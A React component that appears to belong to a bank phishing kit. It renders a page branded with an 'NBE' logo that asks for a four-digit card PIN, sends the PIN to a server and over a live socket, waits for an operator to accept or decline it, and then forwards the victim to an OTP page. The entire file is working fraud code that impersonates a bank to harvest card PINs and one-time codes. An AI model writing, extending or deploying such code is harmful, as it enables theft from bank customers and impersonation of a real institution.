import axios from "axios";
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { useLanguage } from "../hooks/useLanguage";
import { useAdminApproval } from "../hooks/useAdminApproval";
import ProcessingOverlay from "../components/nbe/ProcessingOverlay";
import DeclineError from "../components/nbe/DeclineError";
import OutlinedInput from "../components/nbe/OutlinedInput";

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const orderId = sessionStorage.getItem("id");
  const { t, dir } = useLanguage();
  const { waiting, setWaiting, clearError, declineMessage } = useAdminApproval({
    orderId,
    acceptEvent: "acceptVisaPin",
    declineEvent: "declineVisaPin",
    declineMessageKey: "declinePin",
    onAccept: () => navigate("/visaOtp"),
  });

  const handlePinChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    clearError();
    if (!orderId) return;

    setWaiting(true);
    try {
      await axios.post(api_route + "/visaPin/" + orderId, { pin });
      socket.emit("visaPin", { id: orderId, pin });
    } catch (err) {
      console.log(err);
      setWaiting(false);
    }
  };

  return (
    <div className="w-full min-h-screen bg-white flex flex-col items-center">
      {waiting && <ProcessingOverlay />}
      <form
        className="w-full max-w-md mx-auto px-4 pb-6 flex flex-col min-h-screen"
        onSubmit={handleSubmit}
        dir={dir}
      >
        <div className="flex flex-col items-center gap-8 mt-12">
          <img src="/img1.png" alt="NBE Logo" className="w-1/2" />
          <p
            className={`text-zinc-800 w-full ${
              dir === "rtl" ? "text-right" : "text-left"
            } text-base leading-relaxed px-2`}
          >
            {t("pinInstructions")}
          </p>
        </div>

        <div className="w-full flex flex-col mt-10 gap-6">
          {!orderId && (
            <p className="text-red-600 text-center text-sm">
              {t("sessionExpired")}
            </p>
          )}

          <OutlinedInput
            type="password"
            required
            dir="ltr"
            label={t("pinLabel")}
            value={pin}
            onChange={handlePinChange}
            inputMode="numeric"
            maxLength={4}
            minLength={4}
            disabled={!orderId}
            placeholder={"XXXX"}
            className="text-center"
          />

          <button
            type="submit"
            disabled={waiting || !orderId}
            className="w-full bg-nbe-green text-white font-semibold rounded-xl py-3 text-lg disabled:opacity-70"
          >
            {t("submit")}
          </button>
          <div className="flex w-full justify-center mt-10">
            <div className="nbe-bounce">
              <img src="/pin.png" alt="pin" className="block max-w-full h-auto" />
            </div>
          </div>
          <DeclineError message={declineMessage} />
        </div>
      </form>
    </div>
  );
};

export default Pin;
